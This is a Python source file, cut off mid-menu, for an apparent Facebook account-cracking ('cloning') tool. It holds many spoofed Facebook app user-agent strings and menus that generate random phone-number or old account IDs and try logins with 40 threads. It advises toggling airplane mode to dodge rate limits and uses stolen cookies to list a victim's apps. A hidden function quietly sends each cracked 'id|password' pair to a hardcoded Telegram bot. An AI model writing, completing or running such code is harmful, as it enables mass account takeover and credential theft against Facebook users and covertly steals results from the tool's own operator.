    "FBAN/FB4A;FBAV/333.0.0.2.109;FBBV/125462675;FBDM/{density=3.4,width=1080,height=1443};FBLC/hi_IN;FBRV/522465335;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/363.0.0.9.182;FBBV/206195166;FBDM/{density=2.4,width=1080,height=1408};FBLC/cs_CZ;FBRV/639116943;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/386.0.0.6.162;FBBV/316270744;FBDM/{density=2.2,width=1080,height=1419};FBLC/ru_RU;FBRV/327063785;FBCR/MtelBG;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/334.0.0.8.99;FBBV/219271349;FBDM/{density=2.2,width=1080,height=1458};FBLC/pl_PL;FBRV/794043356;FBCR/EE;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/305.0.0.3.141;FBBV/907351830;FBDM/{density=2.5,width=1080,height=1421};FBLC/en_GB;FBRV/799833329;FBCR/EE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/368.0.0.5.163;FBBV/470819323;FBDM/{density=3.4,width=1080,height=1428};FBLC/cs_CZ;FBRV/719782766;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/341.0.0.6.136;FBBV/821870884;FBDM/{density=3.5,width=1080,height=1439};FBLC/cs_CZ;FBRV/316102432;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/311.0.0.4.197;FBBV/959529695;FBDM/{density=3.3,width=1080,height=1422};FBLC/en_US;FBRV/898856923;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/276.0.0.7.173;FBBV/299855126;FBDM/{density=2.5,width=1080,height=1465};FBLC/en_IN;FBRV/489691046;FBCR/Vi India;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/337.0.0.9.111;FBBV/734992081;FBDM/{density=3.5,width=1080,height=1499};FBLC/es_ES;FBRV/737957830;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/211.0.0.2.180;FBBV/533402391;FBDM/{density=2.4,width=1080,height=1487};FBLC/es_ES;FBRV/799013304;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/203.0.0.2.108;FBBV/133763430;FBDM/{density=2.4,width=1080,height=1407};FBLC/he_IL;FBRV/330264488;FBCR/Oi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/251.0.0.6.185;FBBV/200619978;FBDM/{density=2.4,width=1080,height=1417};FBLC/he_IL;FBRV/309350022;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/206.0.0.5.163;FBBV/384956526;FBDM/{density=3.5,width=1080,height=1431};FBLC/hi_IN;FBRV/493241268;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/252.0.0.1.163;FBBV/457269985;FBDM/{density=2.5,width=1080,height=1427};FBLC/en_GB;FBRV/223591357;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/382.0.0.4.185;FBBV/626342772;FBDM/{density=2.3,width=1080,height=1434};FBLC/lt_LT;FBRV/281400984;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/307.0.0.2.140;FBBV/704588137;FBDM/{density=2.2,width=1080,height=1422};FBLC/lt_LT;FBRV/553435089;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/210.0.0.8.167;FBBV/127284448;FBDM/{density=2.3,width=1080,height=1435};FBLC/en_GB;FBRV/420420404;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/308.0.0.5.151;FBBV/579433762;FBDM/{density=2.3,width=1080,height=1450};FBLC/hi_IN;FBRV/732125651;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/381.0.0.8.172;FBBV/609627612;FBDM/{density=2.4,width=1080,height=1472};FBLC/ it_IT;FBRV/596732652;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/311.0.0.5.162;FBBV/492302613;FBDM/{density=2.4,width=1080,height=1424};FBLC/ru_RU;FBRV/531103051;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/235.0.0.3.170;FBBV/712346985;FBDM/{density=3.5,width=1080,height=1489};FBLC/en_GB;FBRV/911533462;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/376.0.0.3.103;FBBV/213696303;FBDM/{density=2.5,width=1080,height=1475};FBLC/nl_NL;FBRV/984741165;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2011K2C;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/268.0.0.9.131;FBBV/151222271;FBDM/{density=3.3,width=1080,height=1431};FBLC/en_IN;FBRV/295059142;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/329.0.0.7.177;FBBV/307393345;FBDM/{density=3.2,width=1080,height=1417};FBLC/pt_PT;FBRV/976402820;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/333.0.0.2.169;FBBV/528443796;FBDM/{density=3.3,width=1080,height=1432};FBLC/hi_IN;FBRV/342276937;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/203.0.0.2.139;FBBV/978504811;FBDM/{density=3.3,width=1080,height=1484};FBLC/ it_IT;FBRV/890434785;FBCR/Sprint;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/349.0.0.2.193;FBBV/524369907;FBDM/{density=2.2,width=1080,height=1406};FBLC/en_GB;FBRV/628173263;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/331.0.0.1.101;FBBV/920495442;FBDM/{density=3.3,width=1080,height=1470};FBLC/pl_PL;FBRV/338094680;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/340.0.0.2.139;FBBV/569555858;FBDM/{density=3.5,width=1080,height=1483};FBLC/nl_NL;FBRV/875548930;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/260.0.0.3.155;FBBV/157289057;FBDM/{density=2.2,width=1080,height=1429};FBLC/he_IL;FBRV/550957248;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/319.0.0.4.135;FBBV/427023410;FBDM/{density=2.5,width=1080,height=1436};FBLC/en_PK;FBRV/480753876;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/212.0.0.2.188;FBBV/830200379;FBDM/{density=2.4,width=1080,height=1439};FBLC/es_ES;FBRV/889724123;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/276.0.0.5.105;FBBV/742530592;FBDM/{density=2.2,width=1080,height=1408};FBLC/pl_PL;FBRV/925976405;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/371.0.0.9.129;FBBV/376807011;FBDM/{density=2.3,width=1080,height=1467};FBLC/lt_LT;FBRV/188732437;FBCR/EE;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/302.0.0.5.116;FBBV/578275491;FBDM/{density=3.5,width=1080,height=1465};FBLC/he_IL;FBRV/809868925;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/392.0.0.1.156;FBBV/280211658;FBDM/{density=3.4,width=1080,height=1449};FBLC/id_ID;FBRV/347230102;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/353.0.0.9.138;FBBV/729972942;FBDM/{density=2.4,width=1080,height=1451};FBLC/en_PK;FBRV/809073252;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/315.0.0.8.111;FBBV/640672899;FBDM/{density=3.5,width=1080,height=1467};FBLC/nl_NL;FBRV/675911863;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/369.0.0.6.114;FBBV/557612703;FBDM/{density=3.4,width=1080,height=1459};FBLC/id_ID;FBRV/769078908;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/279.0.0.4.153;FBBV/267246342;FBDM/{density=3.2,width=1080,height=1497};FBLC/en_US;FBRV/373967218;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/206.0.0.3.152;FBBV/901715453;FBDM/{density=3.2,width=1080,height=1402};FBLC/id_ID;FBRV/743966849;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/200.0.0.9.130;FBBV/186868798;FBDM/{density=2.2,width=1080,height=1416};FBLC/nl_NL;FBRV/844850684;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/377.0.0.7.134;FBBV/288953980;FBDM/{density=3.2,width=1080,height=1429};FBLC/ru_RU;FBRV/926564585;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/286.0.0.4.160;FBBV/725209717;FBDM/{density=2.5,width=1080,height=1466};FBLC/id_ID;FBRV/521862655;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/300.0.0.7.137;FBBV/606158909;FBDM/{density=2.4,width=1080,height=1484};FBLC/pl_PL;FBRV/775176792;FBCR/Jazz;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/391.0.0.3.103;FBBV/125233167;FBDM/{density=2.4,width=1080,height=1450};FBLC/ it_IT;FBRV/355002830;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/289.0.0.7.192;FBBV/581823484;FBDM/{density=2.4,width=1080,height=1483};FBLC/id_ID;FBRV/845569598;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/299.0.0.7.196;FBBV/405678679;FBDM/{density=3.3,width=1080,height=1499};FBLC/es_ES;FBRV/465728378;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/280.0.0.3.188;FBBV/746592368;FBDM/{density=2.2,width=1080,height=1490};FBLC/en_GB;FBRV/985618460;FBCR/Vi India;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/265.0.0.8.106;FBBV/946906226;FBDM/{density=3.4,width=1080,height=1477};FBLC/en_US;FBRV/615215230;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/217.0.0.8.133;FBBV/183003267;FBDM/{density=2.2,width=1080,height=1441};FBLC/ru_RU;FBRV/478074034;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7BG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    ]
#───────────────[ INDICATION ]─────────────────────────#
id,id2,loop,oki,cpi,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
ok,cp=0,0
cokbrut=[]
pwpluss,pwnya=[],[]
#───────────────[ COLOR-LIST]─────────────────────────#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' 
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###───────────────[ ANSII COLOR STYLE]─────────────────────────###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
###───────────────[ RICH COLOR STYLE ]─────────────────────────###
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
RED = '\033[1;31m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
pink = '\033[1;35m'
G3 = '\x1b[38;5;48m'
#───────────────[ CONVERTER-BULAN ]─────────────────────────#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#───────────────SECURITY───────────────#
#───────────────[ APPLICATION CHECKER ]───────────────#
def cek_apk(kuki):
    session = requests.Session()
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print("\r%s  \033[0m➛ %s%s" % (P, H, game[i].replace("Added on", " Added on")))
    except AttributeError:
        print("\r    %s\033[0m cookie invalid" % (M))
    
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print("\r%s  \033[0m➛ %s" % (P, game[i].replace("Expired", " Expired")))
    except AttributeError:
        print("\r    %s \033[0mcookie invalid" % (M))
#───────────────[ YEAR-CHECKER ]───────────────#
#───────────────[ BOT-SUPPORT ]───────────────#
import requests
def Sad(idf,pw):
    try:
        token = "6997036864:AAGLXtD3HU8h7Xvin2mgWjHGAR1I6EmyzNw"
        chatid = "6305579179"
        ok_id =str(idf+"|"+pw)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
def Sad(uid,pas):
    try:
        token = "6997036864:AAGLXtD3HU8h7Xvin2mgWjHGAR1I6EmyzNw"
        chatid = "6305579179"
        ok_id =str(uid+"|"+pas)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def linex():
    print(f'\r\033[1;92m  ═══════════════════════════════════════════════════')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.06)
logo =f'''
\033[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;93m


\033[1;32m██████╗  █████╗  ██████╗ ██╗      █████╗ 
\033[1;91m██╔══██╗██╔══██╗██╔════╝ ██║     ██╔══██╗
\033[1;91m██████╔╝███████║██║  ███╗██║     ███████║
\033[1;91m██╔═══╝ ██╔══██║██║   ██║██║     ██╔══██║
\033[1;91m██║     ██║  ██║╚██████╔╝███████╗██║  ██║
\033[1;32m╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                \x1b[37;41m\t 𝙒𝙚𝙡𝙡𝙘𝙖𝙢𝙚 𝙏𝙤 𝙀𝙢𝙤𝙣 𝙋𝙖𝙜𝙡𝘼 𝙏𝙤𝙤𝙡\x1b[0;m\n\n\x1b[1;37m                                                                                                                                            
\033[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[1;91m═══════════════════════════════════════════════════
\033[1;32m • DEVLOPER EMON
 • TOOL TYPE : RANDOM-FILE-OLD
 \033[1;91m• VERSION [ \033[1;91m9.01\033[1;91m
 
 \033[1;91m ═══════════════════════════════════════════════════'''
os.system('clear')
print(logo)
uname = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m YOUR NAME \033[1;91m: \033[1;35m')
#───────────────[ MAIN MENU ]───────────────#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.008)
import os

def menu():
    os.system('clear')
    print(logo)
    jalan(f"\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    jalan('  \033[1;91m═══════════════════════════════════════════════════')
    jalan(f"""\033[1;31m[\033[1;37m1\033[1;31m] \033[0;92mFILE CLONING""")
    jalan(f"""\033[1;31m[\033[1;37m2\033[1;31m] \033[1;32mRANDOM CLONING""")
    jalan(f"""\033[1;31m[\033[1;37m3\033[1;31m] \033[1;32mOLD ID CLONING""")
  #  jalan(f"""\033[1;31m[\033[1;37m4\033[1;31m] \033[1;37mJOIN MESSENGER GROUP""")
    jalan("""\033[1;31m[\033[1;37m0\033[1;31m] \033[1;91mEXIT""")
    jalan('  \033[1;91m═══════════════════════════════════════════════════')
    SHAJON = input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
    os.system('clear')
    print(logo)
    if SHAJON in ['1','01']:
        crack_file()
    elif SHAJON in ['2','02']:
        all_rndm()
    elif SHAJON in ['3','03']:
        _old_()
    elif SHAJON in ['4','04']:
        os.system('xdg-open https://wa.me/+8801867850909')
        menu()
    elif SHAJON in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        jalan('\033[1;91m═══════════════════════════════════════════════════')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        animation(' [×] SELECT CORRECTLY ')
        menu()
#───────────────[ OLD - MENU ]───────────────# 
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def _old_():
    user = []
    jalan(f'\033[1;31m[\033[1;37m☂\033[1;31m] \033[1;37mEXAMPLE    \033[1;33m : \033[1;37m3000/5000/10000/99999')
    jalan(f'\r\033[1;91m  ═══════════════════════════════════════════════════')
    limit = input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;32m INPUT \033[1;31m\033[1;32m: ")
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD 1 (2010-2014) ')
    jalan(f'\033[1;31m[\033[1;37m2\033[1;31m] \033[1;37mMETHOD 2 (2007-2010) ')
    jalan(f'\033[1;31m[\033[1;37m3\033[1;31m] \033[1;37mMETHOD 3 (2004-2009) ')
    jalan(f'\r\033[1;91m  ═══════════════════════════════════════════════════')
    ask = input(f"\033[1;31m[\033[1;37m?\033[1;32m] INPUT : ")
    
    if ask in ["1"]:
        star = "10000"
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    elif ask in ["2"]:
        star = "100000"
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        star = "1000000"
        for i in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)

    with ThreadPool(max_workers=40) as sunami:
        os.system('clear')
        print(logo)
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46m METHOD : M\x1b[38;5;46m{ask}')
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        jalan(f'\r\033[1;91m  ═══════════════════════════════════════════════════')
        
        for mal in user:
            uid = star + mal
            sunami.submit(login, uid)

loop = 0
oks = []
cps = []
#__________________| UNIVERSAL RANDOM CLONE|__________________#
def all_rndm():
    user = []
    clear()
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE [BD] : 017 | 019 | 018 | 016 ')
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE [INDIA] : 91639 | 91934 | 91902 | 91937 ')
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE [NEPAL] : 9815 | 9814 | 9861 | 9840 ')
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE [PAKISTAN] : 0306 | 0335 | 0315 | 0345 ')
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE [AFGHANISTAN] : 9340 | 9360 | 9330 | 9350')
    jalan('  \033[10;31m═══════════════════════════════════════════════════')
    code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
    clear()
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
    jalan('  \033[10;31m═══════════════════════════════════════════════════')
    try:
        limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : '))
    except ValueError:
        limit = 50000
    clear()
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m1\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM1\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mB-API\x1b[38;5;196m]')
